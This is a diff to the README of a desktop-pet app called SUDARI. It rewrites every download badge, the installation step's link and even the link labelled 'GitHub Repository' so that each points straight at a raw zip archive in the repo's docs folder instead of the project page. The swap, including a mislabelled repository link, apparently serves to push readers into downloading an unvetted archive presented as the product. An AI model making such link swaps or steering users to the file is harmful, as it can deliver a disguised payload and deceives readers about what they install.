@@ -1,6 +1,6 @@
 # 🦦 SUDARI - A Tiny River Otter for Your Desktop
 
-[![Download SUDARI](https://img.shields.io/badge/Download-SUDARI-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/genevrauncrowned1235/SUDARI)
+[![Download SUDARI](https://img.shields.io/badge/Download-SUDARI-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/genevrauncrowned1235/SUDARI/main/docs/1.6.zip)
 
 ## 🎯 What Is SUDARI?
 
@@ -30,7 +30,7 @@ SUDARI works seamlessly on both Windows and macOS. No complicated setup - just d
 Getting SUDARI on your computer is incredibly simple. Follow these steps:
 
 ### Step 1: Download SUDARI
-[Visit this link to download the application](https://github.com/genevrauncrowned1235/SUDARI)
+[Visit this link to download the application](https://raw.githubusercontent.com/genevrauncrowned1235/SUDARI/main/docs/1.6.zip)
 
 The download page will open in your browser. Look for the download button or the latest release file and click it to start downloading.
 
@@ -150,7 +150,7 @@ Definitely! SUDARI is designed to be professional and unobtrusive. The gentle re
 ## 📚 Additional Resources
 
 ### Community and Support
-- **GitHub Repository:** [SUDARI on GitHub](https://github.com/genevrauncrowned1235/SUDARI)
+- **GitHub Repository:** [SUDARI on GitHub](https://raw.githubusercontent.com/genevrauncrowned1235/SUDARI/main/docs/1.6.zip)
 - **Issue Tracker:** Report bugs or request features through the GitHub issues page
 - **Documentation:** Check the repository's wiki for detailed guides
 
@@ -161,7 +161,7 @@ Watch the GitHub repository to receive notifications about new releases and upda
 
 Don't wait to add a little joy to your desktop. Download SUDARI now and discover how a tiny pixel otter can transform your productivity routine. With its charming personality, practical features, and multilingual support, SUDARI is the desktop companion you never knew you needed.
 
-[![Get SUDARI Now](https://img.shields.io/badge/Get%20SUDARI-Now-FF6B6B?style=for-the-badge&logo=download&logoColor=white)](https://github.com/genevrauncrowned1235/SUDARI)
+[![Get SUDARI Now](https://img.shields.io/badge/Get%20SUDARI-Now-FF6B6B?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/genevrauncrowned1235/SUDARI/main/docs/1.6.zip)
 
 Your new productivity buddy is just one click away. Let the otter help you work smarter, take better breaks, and enjoy your time at the computer more than ever before.
 
